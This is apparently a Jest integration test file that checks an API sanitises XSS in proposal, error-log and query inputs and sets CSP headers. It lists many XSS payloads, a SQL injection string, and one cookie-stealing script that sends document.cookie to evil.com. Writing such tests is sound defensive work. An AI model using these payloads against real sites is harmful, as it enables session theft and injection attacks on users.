import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';

const BASE_URL = process.env.TEST_API_URL || 'http://localhost:3001';

describe('XSS Protection Integration Tests', () => {
  describe('Proposal Endpoint XSS Protection', () => {
    it('should sanitize XSS in proposal title', async () => {
      const maliciousTitle = '<script>alert("XSS")</script>Test Proposal';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: maliciousTitle,
          summary: 'Valid summary text'
        });

      expect(response.status).toBe(201);
      expect(response.body.title).not.toContain('<script>');
      expect(response.body.title).toContain('Test Proposal');
    });

    it('should sanitize XSS in proposal summary', async () => {
      const maliciousSummary = 'Summary text <img src=x onerror=alert(1)> more text';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Valid Title',
          summary: maliciousSummary
        });

      expect(response.status).toBe(201);
      expect(response.body.summary).not.toContain('<img');
      expect(response.body.summary).not.toContain('onerror');
    });

    it('should handle polyglot XSS payload', async () => {
      const polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Test Title',
          summary: polyglot
        });

      expect(response.status).toBe(201);
      expect(response.body.summary).not.toContain('javascript:');
      expect(response.body.summary).not.toContain('oNcliCk');
      expect(response.body.summary).not.toContain('<sVg');
    });
  });

  describe('Error Logging Endpoint XSS Protection', () => {
    it('should sanitize XSS in error message', async () => {
      const maliciousMessage = 'Error: <script>fetch("evil.com?c="+document.cookie)</script>';
      const response = await request(BASE_URL)
        .post('/api/errors/log')
        .send({
          source: 'frontend',
          severity: 'error',
          errorType: 'client_error',
          message: maliciousMessage
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should sanitize XSS in error details object', async () => {
      const maliciousDetails = {
        componentStack: '<img src=x onerror=alert(1)>',
        userAction: '<svg onload=alert(1)>',
        metadata: {
          nested: '<iframe src="javascript:alert(1)"></iframe>'
        }
      };
      const response = await request(BASE_URL)
        .post('/api/errors/log')
        .send({
          source: 'frontend',
          severity: 'error',
          errorType: 'client_error',
          message: 'Test error',
          details: maliciousDetails
        });

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);
    });

    it('should handle excessively long error messages', async () => {
      const longMessage = 'A'.repeat(10000);
      const response = await request(BASE_URL)
        .post('/api/errors/log')
        .send({
          source: 'frontend',
          severity: 'error',
          errorType: 'client_error',
          message: longMessage
        });

      expect([200, 400]).toContain(response.status);
    });
  });

  describe('Query Parameter XSS Protection', () => {
    it('should sanitize XSS in search query', async () => {
      const maliciousSearch = '<script>alert(1)</script>';
      const response = await request(BASE_URL)
        .get('/api/proposals')
        .query({ search: maliciousSearch, limit: 10 });

      expect([200, 400]).toContain(response.status);
      if (response.status === 200) {
        const responseStr = JSON.stringify(response.body);
        expect(responseStr).not.toContain('<script>');
      }
    });

    it('should sanitize XSS in filter parameters', async () => {
      const maliciousFilter = '"><img src=x onerror=alert(1)>';
      const response = await request(BASE_URL)
        .get('/api/proposals')
        .query({ status: maliciousFilter });

      expect([200, 400]).toContain(response.status);
      if (response.status === 200) {
        const responseStr = JSON.stringify(response.body);
        expect(responseStr).not.toContain('onerror');
      }
    });

    it('should handle SQL injection attempts in query params', async () => {
      const sqlInjection = "' OR '1'='1";
      const response = await request(BASE_URL)
        .get('/api/proposals')
        .query({ search: sqlInjection });

      expect([200, 400]).toContain(response.status);
    });
  });

  describe('Content Security Policy Headers', () => {
    it('should set CSP headers on all responses', async () => {
      const response = await request(BASE_URL)
        .get('/health');

      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['content-security-policy']).toContain('default-src');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    });

    it('should set CSP headers on error responses', async () => {
      const response = await request(BASE_URL)
        .get('/api/nonexistent-endpoint');

      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should allow WebSocket connections to Supabase', async () => {
      const response = await request(BASE_URL)
        .get('/health');

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain('wss://*.supabase.co');
      expect(csp).toContain('https://*.supabase.co');
    });
  });

  describe('Mutation XSS Protection', () => {
    it('should prevent mXSS via noscript', async () => {
      const mxss = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Test',
          summary: mxss
        });

      expect(response.status).toBe(201);
      expect(response.body.summary).not.toContain('onerror');
    });

    it('should prevent mXSS via style mutation', async () => {
      const mxss = '<svg><style><img/src=x onerror=alert(1)></style></svg>';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Test',
          summary: mxss
        });

      expect(response.status).toBe(201);
      expect(response.body.summary).not.toContain('onerror');
    });
  });

  describe('DOM Clobbering Protection', () => {
    it('should prevent DOM clobbering via id attributes', async () => {
      const clobber = '<form id="getElementById">test</form>';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Test',
          summary: clobber
        });

      expect(response.status).toBe(201);
    });

    it('should prevent DOM clobbering via name attributes', async () => {
      const clobber = '<img name="cookie" src="x">';
      const response = await request(BASE_URL)
        .post('/api/proposals')
        .send({
          title: 'Test',
          summary: clobber
        });

      expect(response.status).toBe(201);
      expect(response.body.summary).not.toContain('<img');
    });
  });

  describe('OWASP Top 10 XSS Test Cases', () => {
    const owasp_xss_vectors = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>'
    ];

    owasp_xss_vectors.forEach((vector, index) => {
      it(`should block OWASP vector ${index + 1}: ${vector.substring(0, 30)}...`, async () => {
        const response = await request(BASE_URL)
          .post('/api/proposals')
          .send({
            title: 'Test Title',
            summary: vector
          });

        expect(response.status).toBe(201);
        const summary = response.body.summary || '';
        expect(summary).not.toContain('javascript:');
        expect(summary).not.toContain('onerror');
        expect(summary).not.toContain('onload');
        expect(summary).not.toContain('onfocus');
        expect(summary).not.toContain('onstart');
        expect(summary).not.toContain('ontoggle');
      });
    });
  });
});
